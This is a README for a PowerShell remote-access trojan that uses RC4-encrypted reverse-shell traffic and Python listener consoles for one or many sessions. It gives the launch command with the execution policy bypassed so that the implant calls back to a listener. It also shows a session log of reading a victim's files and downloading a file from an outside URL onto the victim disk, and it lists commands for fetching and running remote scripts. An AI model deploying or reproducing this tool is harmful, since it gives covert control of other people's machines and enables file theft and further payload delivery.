# RC4-PowerShell-RAT
Simple powershell reverse shell using RC4 encryption for all the commands and payloads. PsShellClient.py only accept one client at the time. MultiPsShellClient.py accept several clients at the time.

The RAT will also save all the commands and output received in a log file.

# Usage
```
PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```
```
$ python PsShellClient.py
PS-RemoteShell Python Client v1.0
Mr.Un1k0d3r RingZer0 Team


Usage: PsShellClient.py ip port key

$ python PsShellClient.py 0.0.0.0 1111 test
```

```
$ python MultiPsShellClient.py 127.0.0.1 8888 test 20

PS-RemoteShell Python Client v1.1
Mr.Un1k0d3r RingZer0 Team


Help
------
list            List all sessions
interact id     Interact with a session (Example: interact 1)
background      Return to the main console

[*] Waiting for a connection...


(Main Console)>>> [+] *** NEW Callback from 127.0.0.1:49416. Session ID:15

(Main Console)>>> list
Session         Host
---------       ------
15              Callback from 127.0.0.1:49416

(Main Console)>>> interact 15
(192.168.238.1:RINGZER0\mrun1k0d3r):Command >whoami
RINGZER0\mrun1k0d3r

(192.168.238.1:RINGZER0\mrun1k0d3r):Url >background
(Main Console)>>> list
Session         Host
---------       ------
15              Callback from 127.0.0.1:49416

(Main Console)>>> interact 15
RINGZER0\mrun1k0d3r

(192.168.238.1:RINGZER0\mrun1k0d3r):Command >...
```

# Example
```
powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
```

```
(10.0.0.153:RINGZER0\mrun1k0d3r):Command >help

Supported commands:
------------------------------

        read    [path]          Show the content of the specified file
        remote  [url cmd]       Remotely download powershell script and execute a command
        upload  [url path]      Download a remote file and save it to the victim disk
        help                    Show this help
        
(10.0.0.153:RINGZER0\mrun1k0d3r):Command >read C:\windows\win.ini
[*] ReadFile: Reading C:\windows\win.ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
...
[*] ReadFile: execution Completed

(10.0.0.153:RINGZER0\mrun1k0d3r):Command >upload https://home.ringzer0team.com/ps.php C:\windows\temp\ps.txt
[*] DownloadToDisk: Fetching https://home.ringzer0team.com/ps.php
[*] DownloadToDisk: execution Completed



```

# Credit 
Mr.Un1k0d3r RingZer0 Team

https://ringzer0team.com
